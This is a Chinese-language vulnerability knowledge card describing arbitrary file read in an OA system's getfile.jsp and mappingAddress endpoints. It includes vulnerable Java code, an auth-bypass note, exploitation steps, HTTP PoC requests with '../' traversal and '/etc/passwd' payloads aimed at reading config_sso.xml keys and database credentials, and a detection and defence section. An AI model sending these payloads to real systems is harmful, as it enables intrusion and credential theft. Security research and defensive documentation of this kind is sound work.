---
id: web-generic-file-inclusion-oa-getfile-mappingaddress
title: OA getfile.jsp 与 mappingAddress 接口参数直接进 FileInputStream 导致任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: oa-getfile-mappingaddress-arbitrary-read
aliases:
- OA 任意文件读取
- getfile.jsp 文件读取
- mappingAddress 文件读取
- filename/extname/prop 读取
- FileInputStream 审计
tags:
- java
- jsp
- arbitrary-file-read
- path-traversal
- fileinputstream
- oa
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V32
  verified_at: '2026-11-05T06:02:33+08:00'
  notes: 已对照原文与截图核对：getfile.jsp的filename/extname/prop来自request并拼入FileInputStream，priv/user来自参数且user为空的鉴权分支被注释；mappingAddress接口原文仅外链截图、未给完整路由，卡片已注明按目标路由替换，未本地核对；原文未给产品版本；PoC未复现
---

## 一句话结论

某 OA 的 `getfile.jsp` 把请求参数 `filename`、`extname`、`prop` 拼成 `Global.getRealPath() + "/" + cfg.get(prop) + "/" + filename + "." + extname` 后交给 `new FileInputStream`，`prop` 还可选择任意配置路径；另一个接口把请求参数 `mappingAddress` 直接赋给 `String s` 并 `new File(s)`/`FileInputStream` 读取。两处都没有路径归一化或白名单，可读取配置文件、系统文件。

## 原理

- **getfile.jsp**：
  ```java
  String filename = ParamUtil.get(request, "filename");
  String extname = request.getParameter("extname");
  String prop = request.getParameter("prop");
  filename = filename + "." + extname;
  Config cfg = new Config();
  String noticefilepath = cfg.get(prop);
  ...
  bis = new BufferedInputStream(new FileInputStream(
      Global.getRealPath() + "/" + noticefilepath + "/" + filename));
  ```
  `filename`/`extname`/`prop` 全部来自请求；`cfg.get(prop)` 用参数选择配置项（可指向不同上传/通知目录），`filename` 可含 `../`，从而跳出 `noticefilepath` 目录。
- **鉴权缺陷**：页面有 `privilege.isUserPrivValid(request, priv)` 检查，但 `user` 为空时的 `else` 分支整段被注释掉；`user`/`priv` 都由请求参数控制。原文指出“只需要 user 不为 null 即可，user 还是通过参数传递”，说明校验可被弱化/绕过。
- **mappingAddress 接口**：`request.getParameter("mappingAddress")` 赋给 `s`，`new File(s)` 后 `FileInputStream` 读取并写入响应；没有前缀、没有规范化，可直接传绝对路径（如 `/etc/passwd`、`C:\Windows\win.ini`）。
- **为什么能读**：Java `File`/`FileInputStream` 不限制 `..`，也不限制绝对路径；过滤/鉴权只检查表面参数，未对最终路径做 `getCanonicalPath()` 白名单校验。
- **影响**：读取 `WEB-INF/classes` 配置、`config_sso.xml`（含 3DES key）、数据库连接串、系统文件；与 skey 伪造/上传链组合可进一步 RCE。

## 触发条件

- 目标为使用该 OA 代码库的应用，存在 `getfile.jsp` 与 `mappingAddress` 读取接口。
- 两个 JSP/接口可访问；`getfile.jsp` 的 `user`/`priv` 参数按原文方式可绕过或页面鉴权被注释。
- 应用进程对目标文件有读权限。
- 目标未对 `filename`/`extname`/`prop`/`mappingAddress` 做路径白名单或 WAF 拦截。

## 利用步骤

1. 访问 `getfile.jsp`，先传 `user=admin&priv=read&filename=...&extname=...&prop=...` 确认页面不回“非法用户”。
2. 读取已知文件：`prop` 选一个存在的配置目录（如通知/上传目录），`filename=../../../../WEB-INF/web.xml`，`extname=`/`xml` 按拼接调整；`filename + "." + extname` 会多一个点，可用 `extname` 补齐或让文件名以点结尾。
3. 读取 `config_sso.xml` 获取 3DES key，或读取数据库配置。
4. 对 `mappingAddress` 接口直接传绝对路径：`mappingAddress=/etc/passwd`（Linux）或 `C:\Windows\win.ini`（Windows）。
5. 保存响应作为证据；不要修改文件。

## PoC

getfile.jsp（结构示意，`prop` 需替换为目标存在的配置键）：

```http
GET /oa/getfile.jsp?user=admin&priv=read&prop=file_notice&filename=../../../../WEB-INF/web.xml&extname= HTTP/1.1
Host: target:8088
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

mappingAddress 接口（原文未给出完整路由，按目标路由替换）：

```http
GET /oa/xxx?mappingAddress=/etc/passwd HTTP/1.1
Host: target:8088
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

## 变体与关联

- **`prop` 选择配置**：`cfg.get(prop)` 可指向不同目录；若 `prop` 为空，路径可能变成 `realPath + "/null/" + filename`，需要选择有效键。
- **绝对路径**：`mappingAddress` 直接支持绝对路径；`getfile.jsp` 有 `realPath + "/" + noticefilepath + "/"` 前缀，需用 `../` 跳出。
- **Windows/Linux**：Windows 用 `..\`、`C:\`；Linux 用 `../`、`/etc/`。
- 关联卡片：[[web-generic-auth-oa-skey-3des-admin-token-forgery]]、[[web-generic-file-upload-oa-skey-filecase-netdisk-notice]]。

## 检测与防御

- **代码**：`filename`/`extname`/`prop`/`mappingAddress` 全部白名单化；`Path.normalize()` 后校验目标位于允许目录；禁止绝对路径与 `..`；`cfg.get(prop)` 使用固定枚举而非用户键。
- **鉴权**：恢复 `getfile.jsp` 的鉴权分支，不要把 `user`/`priv` 作为可信参数；对读取接口做会话/权限校验。
- **检测**：参数含 `../`、`..\`、`/etc/`、`C:\`、`WEB-INF`、`config_sso.xml`；读取接口返回非媒体内容/配置文本；同一会话枚举多个系统文件。
- **应急**：审计访问日志，确认读取过哪些文件；轮换 `config_sso.xml` 中的 key 与数据库凭据；修复后回归正常附件下载。
